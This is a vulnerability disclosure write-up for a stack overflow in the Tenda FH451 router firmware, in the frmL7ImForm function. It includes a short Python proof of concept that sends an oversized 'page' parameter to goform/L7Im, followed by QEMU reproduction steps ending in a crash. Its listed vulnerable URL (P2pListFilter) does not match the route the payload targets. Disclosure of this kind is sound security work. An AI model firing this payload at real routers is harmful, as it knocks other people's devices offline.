# The router Tenda FH451 V1.0.0.9 of Shenzhen Jixiang Tenda Technology Co., Ltd. has a stack overflow vulnerability

Firmware download link:https://tenda.com.cn/material/show/101629

Vulnerability URL:http://192.168.100.157:80/goform/P2pListFilter

The vulnerability occurs in the function.`frmL7ImForm`

![](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202504022235740.png)

The program obtains the user input parameter "page" but does not check its size. When the input parameter is too large, it causes a stack overflow, leading to program crashes or exploitation.
Cross-referenced to the function route `L7Im` in the `frmL7ImForm` function.

![](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202504022236989.png)

Cross-referenced to the function `sub_2DBE0`, with attention to lines 44 and 47.

![](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202504022238355.png)

The path of the webpage where the vulnerability occurs is known to be `goform/L7Im`.

payload:(python)

```python
import requests

url = "http://192.168.100.163/goform/L7Im"

payload = {
   'page': b'a'*(0x100000)
}

res = requests.post(url=url, data=payload)
print("Status Code:", res.status_code)
print("Response:", res.text)
```

# Reproduction Steps

## Launch QEMU Emulation

Open the QEMU emulator to simulate the environment.

![](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202504022240892.png)

Run the script.

![](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202504022240996.png)

![](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202503281215926.png)

![](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202504022242551.png)

The router has crashed.

